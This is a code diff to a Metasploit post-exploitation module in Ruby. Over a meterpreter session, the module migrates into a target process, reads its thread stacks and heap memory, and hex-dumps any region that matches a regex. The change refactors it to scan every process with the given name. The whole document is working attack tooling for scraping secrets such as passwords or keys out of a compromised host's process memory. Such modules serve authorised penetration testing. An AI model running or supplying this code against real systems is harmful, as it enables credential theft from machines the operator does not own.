@@ -25,39 +25,29 @@ class Metasploit3 < Msf::Post
 		))
 		register_options([
 			OptString.new('PROCESS', [true, 'Name of the process to dump memory from', nil]),
-			OptString.new('REGEX', [true, 'Regular expression to search for with in memory', nil]),
+			OptRegexp.new('REGEX',   [true, 'Regular expression to search for with in memory', nil])
 		], self.class)
 	end
 
-	def run
-		if session.type != "meterpreter"
-			print_error "Only meterpreter sessions are supported by this post module"
-			return
+	def dump_data(target_pid)
+		# we need to be inside the process to walk the heap using railgun
+		current = client.sys.process.getpid
+		if target_pid != current
+			print_status("Migrating into #{target_pid} to allow for dumping heap data")
+			session.core.migrate(target_pid)
 		end
 
-		print_status("Running module against #{sysinfo['Computer']}")
-		target_pid = nil
+		regex = datastore['REGEX']
 		stack = []
-		name = datastore['PROCESS']
-		regex = Regexp.new(datastore['REGEX'])
-		target_pid = client.sys.process[name]
+		proc = client.sys.process.open(target_pid, PROCESS_ALL_ACCESS)
 
-		unless target_pid
-			print_error("Could not access the target process")
-			return
-		end
-
-		print_status("Found #{datastore['PROCESS']} running as pid: #{target_pid}")
-
-		process = session.sys.process.open(target_pid, PROCESS_ALL_ACCESS)
 		begin
-			print_status("Walking process threads...")
-			threads = process.thread.each_thread do |tid|
-				thread = process.thread.open(tid)
+			threads = proc.thread.each_thread do |tid|
+				thread = proc.thread.open(tid)
 				esp = thread.query_regs['esp']
-				addr = process.memory.query(esp)
+				addr = proc.memory.query(esp)
 				vprint_status("Found Thread TID: #{tid}\tBaseAddress: 0x%08x\t\tRegionSize: %d bytes" % [addr['BaseAddress'], addr['RegionSize']])
-				data = process.memory.read(addr['BaseAddress'], addr['RegionSize'])
+				data = proc.memory.read(addr['BaseAddress'], addr['RegionSize'])
 				stack << {
 							'Address' => addr['BaseAddress'],
 							'Size' => addr['RegionSize'],
@@ -66,13 +56,6 @@ class Metasploit3 < Msf::Post
 						}
 					end
 		rescue
-		end
-
-		# we need to be inside the process to walk the heap using railgun
-		current = session.sys.process.getpid
-		if target_pid != current
-			print_status("Migrating into #{target_pid} to allow for dumping heap data")
-			session.core.migrate(target_pid)
 		end
 
 		heap = []
@@ -92,21 +75,24 @@ class Metasploit3 < Msf::Post
 		end
 
 		print_status("Walking the heap... this could take some time")
-		begin
-			heap = []
-			handles.each do |handle|
-				lpentry = "\x00" * 42
-				while (ret = railgun.kernel32.HeapWalk(handle, lpentry)) and ret['return']
-					entry = ret['lpEntry'][0, 4].unpack('V')[0]
-					size = ret['lpEntry'][4, 4].unpack('V')[0]
-					data = process.memory.read(entry, size)
-
-					vprint_status("Walking Entry: 0x%08x\t Size: %d" % [entry, size])
-					heap << {'Address' => entry, 'Size' => size, 'Handle' => handle, 'Data' => data}
-					lpentry = ret['lpEntry']
-				end
+		heap = []
+		handles.each do |handle|
+			lpentry = "\x00" * 42
+			ret = ''
+			while (ret = railgun.kernel32.HeapWalk(handle, lpentry)) and ret['return']
+				entry = ret['lpEntry'][0, 4].unpack('V')[0]
+				pointer = proc.memory.read(entry, 512)
+				size = ret['lpEntry'][4, 4].unpack('V')[0]
+				data = proc.memory.read(entry, (size == 0) ? 1048576 : size)
+				heap << {
+					'Address' => entry,
+					'Size' => data.length,
+					'Handle' => handle,
+					'Data' => data
+				} if data.length > 0
+				lpentry = ret['lpEntry']
+				break if ret['GetLastError'] == 259 or size == 0
 			end
-		rescue
 		end
 
 		matches = []
@@ -114,7 +100,7 @@ class Metasploit3 < Msf::Post
 			idx = mem['Data'].index(regex)
 
 			if idx != nil
-				print_status("Match found!")
+				print_status("Match found on stack!")
 				print_line
 				data = mem['Data'][idx, 512]
 				print_line(Rex::Text.to_hex_dump(data))
@@ -125,11 +111,42 @@ class Metasploit3 < Msf::Post
 			idx = mem['Data'].index(regex)
 
 			if idx != nil
-				print_status("Match found")
+				print_status("Match found on heap!")
 				print_line
 				data = mem['Data'][idx, 512]
 				print_line(Rex::Text.to_hex_dump(data))
 			end
 		end
+	end
+
+	def run
+		if session.type != "meterpreter"
+			print_error "Only meterpreter sessions are supported by this post module"
+			return
+		end
+
+		print_status("Running module against #{sysinfo['Computer']}")
+
+		proc_name = datastore['PROCESS']
+
+		# Collect PIDs
+		pids = []
+		client.sys.process.processes.each do |p|
+			pids << p['pid'] if p['name'] == proc_name
+		end
+
+		if pids.empty?
+			print_error("No PID found for #{proc_name}")
+			return
+		end
+
+		print_status("PIDs found for #{proc_name}: #{pids * ', '}")
+
+		pids.each do |pid|
+			print_status("Searching in process: #{pid.to_s}...")
+			dump_data(pid)
+			print_line
+		end
+
 	end
 end
